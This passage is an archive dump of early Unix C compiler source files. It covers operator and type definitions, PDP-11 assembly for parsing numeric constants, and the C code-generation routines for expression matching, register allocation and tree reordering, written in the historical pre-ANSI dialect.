struct	hshtab	*csym;
int	cval;
double	fcval;
int	nchstr;
int	nerror;
struct	hshtab	*paraml;
struct	hshtab	*parame;
int	strflg;
int	mosflg;
int	initflg;
int	inhdr;
int	dimtab[dimsiz];
char	obuf[518];
char	sbuf[518];
int	dimp;
int	regvar;
int	bitoffs;
struct	tname	funcblk;

/*
  operators
*/
#define	EOF	0
#define	SEMI	1
#define	LBRACE	2
#define	RBRACE	3
#define	LBRACK	4
#define	RBRACK	5
#define	LPARN	6
#define	RPARN	7
#define	COLON	8
#define	COMMA	9
#define	FSEL	10

#define	KEYW	19
#define	NAME	20
#define	CON	21
#define	STRING	22
#define	FCON	23
#define	SFCON	24

#define	SIZEOF	91
#define	INCBEF	30
#define	DECBEF	31
#define	INCAFT	32
#define	DECAFT	33
#define	EXCLA	34
#define	AMPER	35
#define	STAR	36
#define	NEG	37
#define	COMPL	38

#define	DOT	39
#define	PLUS	40
#define	MINUS	41
#define	TIMES	42
#define	DIVIDE	43
#define	MOD	44
#define	RSHIFT	45
#define	LSHIFT	46
#define	AND	47
#define	OR	48
#define	EXOR	49
#define	ARROW	50
#define	ITOF	51
#define	FTOI	52
#define	LOGAND	53
#define	LOGOR	54
#define	FTOL	56
#define	LTOF	57
#define	ITOL	58
#define	LTOI	59

#define	EQUAL	60
#define	NEQUAL	61
#define	LESSEQ	62
#define	LESS	63
#define	GREATEQ	64
#define	GREAT	65
#define	LESSEQP	66
#define	LESSP	67
#define	GREATQP	68
#define	GREATP	69

#define	ASPLUS	70
#define	ASMINUS	71
#define	ASTIMES	72
#define	ASDIV	73
#define	ASMOD	74
#define	ASRSH	75
#define	ASLSH	76
#define	ASSAND	77
#define	ASOR	78
#define	ASXOR	79
#define	ASSIGN	80

#define	QUEST	90
#define	CALL	100
#define	MCALL	101
#define	JUMP	102
#define	CBRANCH	103
#define	INIT	104
#define	SETREG	105
#define	RFORCE	110
#define	BRANCH	111
#define	LABEL	112
#define	NLABEL	113
#define	RLABEL	114

/*
  types
*/
#define	INT	0
#define	CHAR	1
#define	FLOAT	2
#define	DOUBLE	3
#define	STRUCT	4
#define	RSTRUCT	5
#define	LONG	6
#define	NOTYPE	7	/* used internally */

#define	ALIGN	01
#define	TYPE	07
#define	TYLEN	2
#define	XTYPE	(03<<3)
#define	PTR	010
#define	FUNC	020
#define	ARRAY	030

/*
  storage classes
*/
#define	KEYWC	1
#define	MOS	10
#define	AUTO	11
#define	EXTERN	12
#define	STATIC	13
#define	REG	14
#define	STRTAG	15
#define ARG	16
#define	ARG1	17
#define	FMOS	18

/*
  keywords
*/
#define	GOTO	20
#define	RETURN	21
#define	IF	22
#define	WHILE	23
#define	ELSE	24
#define	SWITCH	25
#define	CASE	26
#define	BREAK	27
#define	CONTIN	28
#define	DO	29
#define	DEFAULT	30
#define	FOR	31

/*
  characters
*/
#define	INSERT	119
#define	PERIOD	120
#define	SQUOTE	121
#define	DQUOTE	122
#define	LETTER	123
#define	DIGIT	124
#define	NEWLN	125
#define	SPACE	126
#define	UNKN	127

/*
 * Special operators in intermediate code
 */
#define	BDATA	200
#define	WDATA	201
#define	PROG	202
#define	DATA	203
#define	BSS	204
#define	CSPACE	205
#define	SSPACE	206
#define	SYMDEF	207
#define	SAVE	208
#define	RETRN	209
#define	EVEN	210
#define	PROFIL	212
#define	SWIT	213
#define	EXPR	214
#define	SNAME	215
#define	RNAME	216
#define	ANAME	217
#define	NULL	218

/*
  Flag bits
*/

#define	BINARY	01
#define	LVALUE	02
#define	RELAT	04
#define	ASSGOP	010
#define	LWORD	020
#define	RWORD	040
#define	COMMUTE	0100
#define	RASSOC	0200
#define	LEAF	0400

/*
 * Conversion codes
 */
#define	ITF	1
#define	ITL	2
#define	LTF	3
#define	ITP	4
#define	PTI	5
#define	FTI	6
#define	LTI	7
#define	FTL	8
#define	XX	15

/*
 * symbol table flags
 */

#define	FNDEL	01
#define	FNUND	02
#define	FKEYW	04
#define	FFIELD	020
-- /usr/source/c/c0t.s mode=0100644 uid=10 gid=1 atime=174920650 mtime=174920650 --
/ assure fake printf (no floating)

.globl	fltused; fltused = 0

/ convert stream to number; result is type.
/ value in cval or fcval

fpp = 1

.globl	_getnum

.globl	_peekc
.globl	_getchar
.globl	_cval
.globl	_fcval
.globl	_error

_getnum:
	.if	fpp
	movif	$10.,fr3
	clrf	fr0
	.endif
	clr	nfract
	clr	totdig
	clr	decpt
	clr	_cval
	mov	2(sp),base
	mov	r2,-(sp)
1:
	jsr	r5,getdig
		br 2f
	.if	fpp
	mulf	fr3,fr0
	movif	r0,fr1
	addf	fr1,fr0
	.endif
	inc	nfract
	br	1b
2:
	tst	decpt
	bne	1f
	clr	nfract
	cmp	r0,$'.
	bne	1f
	mov	pc,decpt
	br	1b
1:
	tst	totdig
	beq	1f
	cmp	r0,$'e
	bne	1f
	clr	-(sp)
	clr	_cval
	mov	pc,decpt
	clr	_cval
	mov	$10.,base
	jsr	pc,_getchar
	cmp	r0,$'+
	beq	2f
	cmp	r0,$'-
	bne	3f
	inc	(sp)
	br	2f
3:
	mov	r0,_peekc
2:
	jsr	r5,getdig
		br 2f
	br	2b
2:
	tst	(sp)+
	beq	2f
	neg	_cval
2:
	sub	_cval,nfract
1:
	mov	r0,_peekc
	tst	totdig
	bne	1f
	mov	$39.,r0		/ "." operator
9:
	mov	(sp)+,r2
	rts	pc
1:
	tst	decpt
	bne	1f
	mov	$21.,r0		/ fixed constant
	br	9b
1:
	.if	fpp
	movif	$1,fr2
	mov	nfract,r2
	mov	r2,-(sp)
	beq	2f
	bgt	1f
	neg	r2
1:
	mulf	fr3,fr2
	sob	r2,1b
2:
	tst	(sp)+
	ble	1f
	divf	fr2,fr0
	br	2f
1:
	mulf	fr2,fr0
2:
	mov	$_fcval,r0
	movf	fr0,(r0)
	tst	(r0)+
	tst	(r0)+
	bne	1f
	tst	(r0)+
	bne	1f
	tst	(r0)+
	bne	1f
	mov	$24.,r0
	mov	_fcval,_cval
	br	9b
1:
	mov	$23.,r0
	br	9b
	.endif
	.if	1-fpp
	mov	$fperr,-(sp)
	jsr	pc,_error
	tst	(sp)+
	mov	$21.,r0
	br	9b
fperr:	<No floating point!\0>; .even
	.endif

getdig:
	mov	_peekc,r0
	beq	1f
	clr	_peekc
	br	2f
1:
	jsr	pc,_getchar
2:
	sub	$'0,r0
	cmp	r0,$9.
	bhi	1f
	inc	totdig
	mov	_cval,r1
	mul	base,r1
	add	r0,r1
	mov	r1,_cval
	tst	(r5)+
	rts	r5
1:
	add	$'0,r0
	rts	r5

.bss
base:	.=.+2
nfract:	.=.+2
decpt:	.=.+2
totdig:	.=.+2
-- /usr/source/c/c10.c mode=0110644 uid=10 gid=1 atime=174920479 mtime=174910916 --
#
/*

	    	C compiler, part 2


*/

#include "c1h.c"

char	maprel[] {	EQUAL, NEQUAL, GREATEQ, GREAT, LESSEQ,
			LESS, GREATQP, GREATP, LESSEQP, LESSP
};

char	notrel[] {	NEQUAL, EQUAL, GREAT, GREATEQ, LESS,
			LESSEQ, GREATP, GREATQP, LESSP, LESSEQP
};

struct tconst czero { CON, INT, 0, 0};
struct tconst cone  { CON, INT, 0, 1};
struct tconst fczero { SFCON, DOUBLE, 0, 0 };

struct	table	*cregtab;

int	nreg	3;
int	isn	10000;
int	namsiz	8;

main(argc, argv)
char *argv[];
{
	extern fout;

	if (argc<4) {
		error("Arg count");
		exit(1);
	}
	if(fopen(argv[1], ascbuf)<0) {
		error("Missing temp file");
		exit(1);
	}
	if ((fout = creat(argv[3], 0666)) < 0) {
		error("Can't create %s", argv[3]);
		exit(1);
	}
	spacep = treespace;
	getree();
	/*
	 * If any floating-point instructions
	 * were used, generate a reference which
	 * pulls in the floating-point part of printf.
	 */
	if (nfloat)
		printf(".globl	fltused\n");
	/*
	 * tack on the string file.
	 */
	close(ascbuf[0]);
	if (fopen(argv[2], ascbuf)<0) {
		error("Missing temp file");
		exit(1);
	}
	printf(".globl\n.data\n");
	getree();
	flush();
	exit(nerror!=0);
}

/*
 * Given a tree, a code table, and a
 * count of available registers, find the code table
 * for the appropriate operator such that the operands
 * are of the right type and the number of registers
 * required is not too large.
 * Return a ptr to the table entry or 0 if none found.
 */
char *match(atree, table, nrleft)
struct tnode *atree;
struct table *table;
{
	int op, d1, d2, t1, t2, dope;
	struct tnode *p2;
	register struct tnode *p1, *tree;
	register struct optab *opt;

	if ((tree=atree)==0)
		return(0);
	if (table==lsptab)
		table = sptab;
	if ((op = tree->op)==0)
		return(0);
	dope = opdope[op];
	if ((dope&LEAF) == 0)
		p1 = tree->tr1;
	else
		p1 = tree;
	t1 = p1->type;
	d1 = dcalc(p1, nrleft);
	if ((dope&BINARY)!=0) {
		p2 = tree->tr2;
		/*
		 * If a subtree starts off with a conversion operator,
		 * try for a match with the conversion eliminated.
		 * E.g. int = double can be done without generating
		 * the converted int in a register by
		 * movf double,fr0; movfi fr0,int .
		 */
		if(opdope[p1->op]&CNVRT && (opdope[p2->op]&CNVRT)==0) {
			tree->tr1 = p1->tr1;
			if (opt = match(tree, table, nrleft))
				return(opt);
			tree->tr1 = p1;
		} else if (opdope[p2->op]&CNVRT && (opdope[p1->op]&CNVRT)==0) {
			tree->tr2 = p2->tr1;
			if (opt = match(tree, table, nrleft))
				return(opt);
			tree->tr2 = p2;
		}
		t2 = p2->type;
		d2 = dcalc(p2, nrleft);
	}
	for (; table->op!=op; table++)
		if (table->op==0)
			return(0);
	for (opt = table->tabp; opt->tabdeg1!=0; opt++) {
		if (d1 > (opt->tabdeg1&077)
		 || (opt->tabdeg1 >= 0100 && (p1->op != STAR)))
			continue;
		if (notcompat(p1, opt->tabtyp1, op)) {
			continue;
		}
		if ((opdope[op]&BINARY)!=0 && p2!=0) {
			if (d2 > (opt->tabdeg2&077)
			 || (opt->tabdeg2 >= 0100) && (p2->op != STAR) )
				continue;
			if (notcompat(p2,opt->tabtyp2, 0))
				continue;
		}
		return(opt);
	}
	return(0);
}

/*
 * Given a tree, a code table, and a register,
 * produce code to evaluate the tree with the appropriate table.
 * Registers reg and upcan be used.
 * If there is a value, it is desired that it appear in reg.
 * The routine returns the register in which the value actually appears.
 * This routine must work or there is an error.
 * If the table called for is cctab, sptab, or efftab,
 * and tree can't be done using the called-for table,
 * another try is made.
 * If the tree can't be compiled using cctab, regtab is
 * used and a "tst" instruction is produced.
 * If the tree can't be compiled using sptab,
 * regtab is used and the register is pushed on the stack.
 * If the tree can't be compiled using efftab,
 * just use regtab.
 * Regtab must succeed or an "op not found" error results.
 *
 * A number of special cases are recognized, and
 * there is an interaction with the optimizer routines.
 */
rcexpr(atree, atable, reg)
struct tnode *atree;
struct table *atable;
{
	register r;
	int modf, nargs, recurf;
	register struct tnode *tree;
	register struct table *table;

	table = atable;
	recurf = 0;
	if (reg<0) {
		recurf++;
		reg = ~reg;
		if (reg>=020) {
			reg =- 020;
			recurf++;
		}
	}
	if((tree=atree)==0)
		return(0);
	switch (tree->op)  {

	/*
	 * A conditional branch
	 */
	case CBRANCH:
		cbranch(optim(tree->btree), tree->lbl, tree->cond, 0);
		return(0);

	/*
	 * An initializing expression
	 */
	case INIT:
		if (tree->tr1->op == AMPER)
			tree->tr1 = tree->tr1->tr1;
		if (tree->tr1->op==NAME)
			pname(tree->tr1);
		else if (tree->tr1==CON)
			psoct(tree->tr1->value);
		else
			error("Illegal initialization");
		putchar('\n');
		return(0);

	/*
	 * Put the value of an expression in r0,
	 * for a switch or a return
	 */
	case RFORCE:
		if((r=rcexpr(tree->tr1, regtab, reg)) != 0)
			printf("mov%c	r%d,r0\n", isfloat(tree->tr1), r);
		return(0);

	/*
	 * sequential execution
	 */
	case COMMA:
		rcexpr(tree->tr1, efftab, reg);
		atree = tree = tree->tr2;
		break;

	/*
	 * In the generated &~ operator,
	 * fiddle things so a PDP-11 "bit"
	 * instruction will be produced when cctab is used.
	 */
	case NAND:
		if (table==cctab) {
			tree->op = TAND;
			tree->tr2 = optim(block(1, COMPL, INT, 0, tree->tr2));
		}
		break;


	/*
	 * Handle a subroutine call. It has to be done
	 * here because if cexpr got called twice, the
	 * arguments might be compiled twice.
	 * There is also some fiddling so the
	 * first argument, in favorable circumstances,
	 * goes to (sp) instead of -(sp), reducing
	 * the amount of stack-popping.
	 */
	case CALL:
		r = 0;
		nargs = 0;
		modf = 0;
		if (tree->tr1->op!=NAME) {	/* get nargs right */
			nargs++;
			nstack++;
		}
		tree = tree->tr2;
		if(tree->op) {
			while (tree->op==COMMA) {
				r =+ comarg(tree->tr2, &modf);
				tree = tree->tr1;
				nargs++;
			}
			r =+ comarg(tree, &modf);
			nargs++;
		}
		tree = atree;
		tree->op = CALL2;
		if (modf && tree->tr1->op==NAME && tree->tr1->class==EXTERN)
			tree->op = CALL1;
		cexpr(tree, regtab, reg);
		popstk(r);
		nstack =- nargs;
		if (table==efftab || table==regtab)
			return(0);
		r = 0;
		goto fixup;

	/*
	 * Longs need special treatment.
	 */
	case ASLSH:
	case LSHIFT:
		if (tree->type==LONG) {
			if (tree->tr2->op==ITOL)
				tree->tr2 = tree->tr2->tr1;
			if (tree->op==ASLSH)
				tree->op = ASLSHL;
			else
				tree->op = LLSHIFT;
		}
		break;

	/*
	 * Try to change * and / to shifts.
	 */
	case TIMES:
	case DIVIDE:
	case ASTIMES:
	case ASDIV:
		tree = pow2(tree);
	}
	/*
	 * Try to find postfix ++ and -- operators that can be
	 * pulled out and done after the rest of the expression
	 */
	if (table!=cctab && table!=cregtab && recurf<2
	 && (opdope[tree->op]&LEAF)==0) {
		if (r=delay(&atree, table, reg)) {
			tree = atree;
			table = efftab;
			reg = r-1;
		}
	}
	/*
	 * Basically, try to reorder the computation
	 * so  reg = x+y  is done as  reg = x; reg =+ y
	 */
	if (recurf==0 && reorder(&atree, table, reg)) {
		if (table==cctab && atree->op==NAME)
			return(reg);
	}
	tree = atree;
	if (table==efftab && tree->op==NAME)
		return(reg);
	if ((r=cexpr(tree, table, reg))>=0)
		return(r);
	if (table!=regtab)  {
		if((r=cexpr(tree, regtab, reg))>=0) {
	fixup:
			modf = isfloat(tree);
			if (table==sptab || table==lsptab) {
				if (tree->type==LONG) {
					printf("mov\tr%d,-(sp)\n",r+1);
					nstack++;
				}
				printf("mov%c	r%d,%c(sp)\n", modf, r,
					table==sptab? '-':0);
				nstack++;
			}
			if (table==cctab)
				printf("tst%c	r%d\n", modf, r);
			return(r);
		}
	}
	if (tree->op>0 && tree->op<RFORCE && opntab[tree->op])
		error("No code table for op: %s", opntab[tree->op]);
	else
		error("No code table for op %d", tree->op);
	return(reg);
}

/*
 * Try to compile the tree with the code table using
 * registers areg and up.  If successful,
 * return the register where the value actually ended up.
 * If unsuccessful, return -1.
 *
 * Most of the work is the macro-expansion of the
 * code table.
 */
cexpr(atree, table, areg)
struct tnode *atree;
struct table *table;
{
	int c, r;
	register struct tnode *p, *p1, *tree;
	struct table *ctable;
	struct tnode *p2;
	char *string;
	int reg, reg1, rreg, flag, opd;
	char *opt;

	tree = atree;
	reg = areg;
	p1 = tree->tr2;
	c = tree->op;
	opd = opdope[c];
	/*
	 * When the value of a relational or a logical expression is
	 * desired, more work must be done.
	 */
	if ((opd&RELAT||c==LOGAND||c==LOGOR||c==EXCLA) && table!=cctab) {
		cbranch(tree, c=isn++, 1, reg);
		rcexpr(&czero, table, reg);
		branch(isn, 0);
		label(c);
		rcexpr(&cone, table, reg);
		label(isn++);
		return(reg);
	}
	if(c==QUEST) {
		if (table==cctab)
			return(-1);
		cbranch(tree->tr1, c=isn++, 0, reg);
		flag = nstack;
		rreg = rcexpr(p1->tr1, table, reg);
		nstack = flag;
		branch(r=isn++, 0);
		label(c);
		reg = rcexpr(p1->tr2, table, rreg);
		if (rreg!=reg)
			printf("mov%c	r%d,r%d\n",
			    isfloat(tree),reg,rreg);
		label(r);
		return(rreg);
	}
	reg = oddreg(tree, reg);
	reg1 = reg+1;
	/*
	 * long values take 2 registers.
	 */
	if (tree->type==LONG && tree->op!=ITOL)
		reg1++;
	/*
	 * Leaves of the expression tree
	 */
	if ((r = chkleaf(tree, table, reg)) >= 0)
		return(r);
	/*
	 * x + (-1) is better done as x-1.
	 */

	if ((tree->op==PLUS||tree->op==ASPLUS) &&
	    (p1=tree->tr2)->op == CON && p1->value == -1) {
		p1->value = 1;
		tree->op =+ (MINUS-PLUS);
	}
	if (table==cregtab)
		table = regtab;
	/*
	 * The following peculiar code depends on the fact that
	 * if you just want the codition codes set, efftab
	 * will generate the right code unless the operator is
	 * postfix ++ or --. Unravelled, if the table is
	 * cctab and the operator is not special, try first
	 * for efftab;  if the table isn't, if the operator is,
	 * or the first match fails, try to match
	 * with the table actually asked for.
	 */
	if (table!=cctab || c==INCAFT || c==DECAFT
	 || (opt = match(tree, efftab, nreg-reg)) == 0)
		if ((opt=match(tree, table, nreg-reg))==0)
			return(-1);
	string = opt->tabstring;
	p1 = tree->tr1;
	p2 = 0;
	if (opdope[tree->op]&BINARY)
		p2 = tree->tr2;
loop:
	/*
	 * The 0200 bit asks for a tab.
	 */
	if ((c = *string++) & 0200) {
		c =& 0177;
		putchar('\t');
	}
	switch (c) {

	case '\0':
		if (!isfloat(tree))
			if (tree->op==DIVIDE || tree->op==ASDIV)
				reg--;
		return(reg);

	/* A1 */
	case 'A':
		p = p1;
		goto adr;

	/* A2 */
	case 'B':
		p = p2;
		goto adr;

	adr:
		c = 0;
		if (*string=='\'') {
			c = 1;
			string++;
		} else if (*string=='+') {
			c = 2;
			string++;
		}
		pname(p, c);
		goto loop;

	/* I */
	case 'M':
		if ((c = *string)=='\'')
			string++;
		else
			c = 0;
		prins(tree->op, c, instab);
		goto loop;

	/* B1 */
	case 'C':
		if ((opd&LEAF) != 0)
			p = tree;
		else
			p = p1;
		goto pbyte;

	/* BF */
	case 'P':
		p = tree;
		goto pb1;

	/* B2 */
	case 'D':
		p = p2;
	pbyte:
		if (p->type==CHAR)
			putchar('b');
	pb1:
		if (isfloat(p))
			putchar('f');
		goto loop;

	/* BE */
	case 'L':
		if (p1->type==CHAR || p2->type==CHAR)
			putchar('b');
		p = tree;
		goto pb1;

	/* F */
	case 'G':
		p = p1;
		flag = 01;
		goto subtre;

	/* S */
	case 'K':
		p = p2;
		flag = 02;
		goto subtre;

	/* H */
	case 'H':
		p = tree;
		flag = 04;

	subtre:
		ctable = regtab;
		c = *string++ - 'A';
		if (*string=='!') {
			string++;
			c =| 020;	/* force right register */
		}
		if ((c&02)!=0)
			ctable = sptab;
		if ((c&04)!=0)
			ctable = cctab;
		if ((flag&01) && ctable==regtab && (c&01)==0
		  && (tree->op==DIVIDE||tree->op==MOD
		   || tree->op==ASDIV||tree->op==ASMOD))
			ctable = cregtab;
		if ((c&01)!=0) {
			p = p->tr1;
			if(collcon(p) && ctable!=sptab) {
				if (p->op==STAR)
					p = p->tr1;
				p = p->tr1;
			}
		}
		if (table==lsptab && ctable==sptab)
			ctable = lsptab;
		if (c&010)
			r = reg1;
		else
			if (opdope[p->op]&LEAF || p->degree < 2)
				r = reg;
			else
				r = areg;
		rreg = rcexpr(p, ctable, r);
		if (ctable!=regtab && ctable!=cregtab)
			goto loop;
		if (c&010) {
			if (c&020 && rreg!=reg1)
				printf("mov%c	r%d,r%d\n",
				    isfloat(tree),rreg,reg1);
			else
				reg1 = rreg;
		} else if (rreg!=reg)
			if ((c&020)==0 && oddreg(tree, 0)==0 && (flag&04 ||
			      flag&01
			  && xdcalc(p2, nreg-rreg-1) <= (opt->tabdeg2&077)
			 ||   flag&02
			  && xdcalc(p1,nreg-rreg-1) <= (opt->tabdeg1&077))) {
				reg = rreg;
				reg1 = rreg+1;
			} else
				printf("mov%c\tr%d,r%d\n",
				    isfloat(tree), rreg, reg);
		goto loop;

	/* R */
	case 'I':
		r = reg;
		if (*string=='-') {
			string++;
			r--;
		}
		goto preg;

	/* R1 */
	case 'J':
		r = reg1;
	preg:
		if (*string=='+') {
			string++;
			r++;
		}
		if (r>nreg)
			error("Register overflow: simplify expression");
		printf("r%d", r);
		goto loop;

	case '-':		/* check -(sp) */
		if (*string=='(') {
			nstack++;
			if (table!=lsptab)
				putchar('-');
			goto loop;
		}
		break;

	case ')':		/* check (sp)+ */
		putchar(')');
		if (*string=='+')
			nstack--;
		goto loop;

	/* #1 */
	case '#':
		p = p1->tr1;
		goto nmbr;

	/* #2 */
	case '"':
		p = p2->tr1;

	nmbr:
		if(collcon(p)) {
			if (p->op==STAR) {
				printf("*");
				p = p->tr1;
			}
			if ((p = p->tr2)->op == CON) {
				if (p->value)
					psoct(p->value);
			} else if (p->op==AMPER)
				pname(p->tr1, 0);
		}
		goto loop;

	case 'T':		/* "tst R" if 1st op not in cctab */
		if (dcalc(p1, 5)>12 && !match(p1, cctab, 10))
			printf("tst	r%d\n", reg);
		goto loop;
	case 'V':	/* adc or sbc as required for longs */
		switch(tree->op) {
		case PLUS:
		case ASPLUS:
		case INCBEF:
		case INCAFT:
			printf("adc");
			break;

		case MINUS:
		case ASMINUS:
		case NEG:
		case DECBEF:
		case DECAFT:
			printf("sbc");
			break;

		default:
			while ((c = *string++)!='\n' && c!='\0');
			break;
		}
		goto loop;
	}
	putchar(c);
	goto loop;
}

/*
 * This routine just calls sreorder (below)
 * on the subtrees and then on the tree itself.
 * It returns non-zero if anything changed.
 */
reorder(treep, table, reg)
struct tnode **treep;
struct table *table;
{
	register r, r1;
	register struct tnode *p;

	p = *treep;
	if (opdope[p->op]&LEAF)
		return(0);
	r1 = 0;
	while(sreorder(&p->tr1, table, reg))
		r1++;
	if (opdope[p->op]&BINARY) 
		while(sreorder(&p->tr2, table, reg))
			r1++;
	r = 0;
	while (sreorder(treep, table, reg))
		r++;
	*treep = optim(*treep);
	return(r);
}

/*
 * Basically this routine carries out two kinds of optimization.
 * First, it observes that "x + (reg = y)" where actually
 * the = is any assignment op is better done as "reg=y; x+reg".
 * In this case rcexpr is called to do the first part and the
 * tree is modified so the name of the register
 * replaces the assignment.
 * Moreover, expressions like "reg = x+y" are best done as
 * "reg = x; reg =+ y" (so long as "reg" and "y" are not the same!).
 */
sreorder(treep, table, reg)
struct tnode **treep;
struct table *table;
{
	register struct tnode *p, *p1;

	p = *treep;
	if (opdope[p->op]&LEAF)
		return(0);
	if (p->op==PLUS)
		if (reorder(&p->tr2, table, reg))
			*treep = p = optim(p);
	p1 = p->tr1;
	if (p->op==STAR || p->op==PLUS) {
		if (reorder(&p->tr1, table, reg))
			*treep = p = optim(p);
		p1 = p->tr1;
	}
	if (p1->op==NAME) switch(p->op) {
		case ASLSH:
		case ASRSH:
		case ASSIGN:
			if (p1->class != REG || isfloat(p->tr2))
				return(0);
			if (p->op==ASSIGN) switch (p->tr2->op) {
			case TIMES:
			case DIVIDE:
				if (!ispow2(p->tr2))
					break;
				p->tr2 = pow2(p->tr2);
			case PLUS:
			case MINUS:
			case AND:
			case NAND:
			case OR:
			case EXOR:
			case LSHIFT:
			case RSHIFT:
				p1 = p->tr2->tr2;
				if (xdcalc(p1) > 12
				 || p1->op==NAME
				 &&(p1->nloc==p->tr1->nloc
				  || p1->regno==p->tr1->nloc))
					return(0);
				p1 = p->tr2;
				p->tr2 = p1->tr1;
				if (p1->tr1->op!=NAME
				 || p1->tr1->class!=REG
				 || p1->tr1->nloc!=p->tr1->nloc)
					rcexpr(p, efftab, reg);
				p->tr2 = p1->tr2;
				p->op = p1->op + ASPLUS - PLUS;
				*treep = p;
				return(1);
			}
			goto OK;

		case ASTIMES:
		case ASDIV:
			if (!ispow2(p))
				return(0);
		case ASPLUS:
		case ASMINUS:
		case ASSAND:
		case ASSNAND:
		case ASOR:
		case ASXOR:
		case DECBEF:
		case INCBEF:
		OK:
			if (table==cctab||table==cregtab)
				reg =+ 020;
			rcexpr(optim(p), efftab, ~reg);
			*treep = p1;
			return(1);
	}
	return(0);
}

/*
 * Delay handles postfix ++ and -- 
 * It observes that "x + y++" is better
 * treated as "x + y; y++".
 * If the operator is ++ or -- itself,
 * it calls rcexpr to load the operand, letting
 * the calling instance of rcexpr to do the
 * ++ using efftab.
 * Otherwise it uses sdelay to search for inc/dec
 * among the operands.
 */
delay(treep, table, reg)
struct tnode **treep;
{
	register struct tnode *p, *p1;
	register r;

	p = *treep;
	if (table!=efftab && (p->op==INCAFT||p->op==DECAFT)
	 && p->tr1->op==NAME) {
		return(1+rcexpr(p->tr1, table, reg));
	}
	p1 = 0;
	if (opdope[p->op]&BINARY)
		p1 = sdelay(&p->tr2);
	if (p1==0)
		p1 = sdelay(&p->tr1);
	if (p1) {
		r = rcexpr(optim(p), table, reg);
		*treep = p1;
		return(r+1);
	}
	return(0);
}

sdelay(ap)
struct tnode **ap;
{
	register struct tnode *p, *p1;

	p = *ap;
	if ((p->op==INCAFT||p->op==DECAFT) && p->tr1->op==NAME) {
		*ap = ncopy(p->tr1);
		return(p);
	}
	if (p->op==STAR || p->op==PLUS)
		if (p1=sdelay(&p->tr1))
			return(p1);
	if (p->op==PLUS)
		return(sdelay(&p->tr2));
	return(0);
}

/*
 * Copy a tree node for a register variable.
 * Used by sdelay because if *reg-- is turned
 * into *reg; reg-- the *reg will in turn
 * be changed to some offset class, accidentally
 * modifying the reg--.
 */
ncopy(ap)
struct tname *ap;
{
	register struct tname *p;

	p = ap;
	if (p->class!=REG)
		return(p);
	return(block(3, NAME, p->type, p->elsize, p->tr1,
	    p->offset, p->nloc));
}

/*
 * If the tree can be immediately loaded into a register,
 * produce code to do so and return success.
 */
chkleaf(atree, table, reg)
struct tnode *atree;
{
	struct tnode lbuf;
	register struct tnode *tree;

	tree = atree;
	if (tree->op!=STAR && dcalc(tree, nreg-reg) > 12)
		return(-1);
	lbuf.op = LOAD;
	lbuf.type = tree->type;
	lbuf.degree = tree->degree;
	lbuf.tr1 = tree;
	return(rcexpr(&lbuf, table, reg));
}

/*
 * Compile a function argument.
 * If the stack is currently empty, put it in (sp)
 * rather than -(sp); this will save a pop.
 * Return the number of bytes pushed,
 * for future popping.
 */
comarg(atree, flagp)
int *flagp;
{
	register struct tnode *tree;
	register retval;

	tree = atree;
	if (nstack || isfloat(tree) || tree->type==LONG) {
		rcexpr(tree, sptab, 0);
		retval = arlength(tree->type);
	} else {
		(*flagp)++;
		rcexpr(tree, lsptab, 0);
		retval = 0;
	}
	return(retval);
}
-- /usr/source/c/c11.c mode=0110666 uid=10 gid=1 atime=174920507 mtime=174910920 --
#
/*
 *  C compiler
 */

#include "c1h.c"

max(a, b)
{
	if (a>b)
		return(a);
	return(b);
}

degree(at)
struct tnode *at;
{
	register struct tnode *t, *t1;

	if ((t=at)==0 || t->op==0)
		return(0);
	if (t->op == CON)
		return(-3);
	if (t->op == AMPER)
		return(-2);
	if (t->op==ITOL && (t1 = isconstant(t)) && t1->value>= 0)
		return(-2);
	if ((opdope[t->op] & LEAF) != 0) {
		if (t->type==CHAR || t->type==FLOAT)
			return(1);
		return(0);
	}
	return(t->degree);
}

pname(ap, flag)
struct tnode *ap;
{
	register i;
	register struct tnode *p;

	p = ap;
loop:
	switch(p->op) {

	case SFCON:
	case CON:
		printf("$");
		psoct(p->value);
		return;

	case FCON:
		printf("L%d", p->value);
		return;

	case NAME:
		i = p->offset;
		if (flag==2)
			i =+ 2;
		if (i) {
			psoct(i);
			if (p->class!=OFFS)
				putchar('+');
			if (p->class==REG)
				regerr();
		}
		switch(p->class) {

		case SOFFS:
		case XOFFS:
			pbase(p);

		case OFFS:
			printf("(r%d)", p->regno);
			return;

		case EXTERN:
		case STATIC:
			pbase(p);
			return;

		case REG:
			printf("r%d", p->nloc);
			return;

		}
		error("Compiler error: pname");
		return;

	case AMPER:
		putchar('$');
		p = p->tr1;
		if (p->op==NAME && p->class==REG)
			regerr();
		goto loop;

	case AUTOI:
		printf("(r%d)%c", p->nloc, flag==1?0:'+');
		return;

	case AUTOD:
		printf("%c(r%d)", flag==1?0:'-', p->nloc);
		return;

	case STAR:
		p = p->tr1;
		putchar('*');
		goto loop;

	}
	error("pname called illegally");
}

regerr()
{
	error("Illegal use of register");
}

pbase(ap)
struct tnode *ap;
{
	register struct tnode *p;

	p = ap;
	if (p->class==SOFFS || p->class==STATIC)
		printf("L%d", p->nloc);
	else
		printf("_%.8s", &(p->nloc));
}

xdcalc(ap, nrleft)
struct tnode *ap;
{
	register struct tnode *p;
	register d;

	p = ap;
	d = dcalc(p, nrleft);
	if (d<20 && p->type==CHAR) {
		if (nrleft>=1)
			d = 20;
		else
			d = 24;
	}
	return(d);
}

dcalc(ap, nrleft)
struct tnode *ap;
{
	register struct tnode *p, *p1;

	if ((p=ap)==0)
		return(0);
	switch (p->op) {

	case NAME:
		if (p->class==REG)
			return(9);

	case AMPER:
	case FCON:
	case AUTOI:
	case AUTOD:
		return(12);

	case CON:
	case SFCON:
		if (p->value==0)
			return(4);
		if (p->value==1)
			return(5);
		if (p->value > 0)
			return(8);
		return(12);

	case STAR:
		p1 = p->tr1;
		if (p1->op==NAME||p1->op==CON||p1->op==AUTOI||p1->op==AUTOD)
			if (p->type!=LONG)
				return(12);
	}
	if (p->type==LONG)
		nrleft--;
	return(p->degree <= nrleft? 20: 24);
}

notcompat(ap, ast, op)
struct tnode *ap;
{
	register at, st;
	register struct tnode *p;

	p = ap;
	at = p->type;
	st = ast;
	if (st==0)		/* word, byte */
		return(at>CHAR && at<PTR);
	if (st==1)		/* word */
		return(at>INT && at<PTR);
	st =- 2;
	if ((at&(~(TYPE+XTYPE))) != 0)
		at = 020;
	if ((at&(~TYPE)) != 0)
		at = at&TYPE | 020;
	if (st==FLOAT && at==DOUBLE)
		at = FLOAT;
	if (p->op==NAME && p->class==REG && op==ASSIGN && st==CHAR)
		return(0);
	return(st != at);
}

prins(op, c, itable)
struct instab *itable;
{
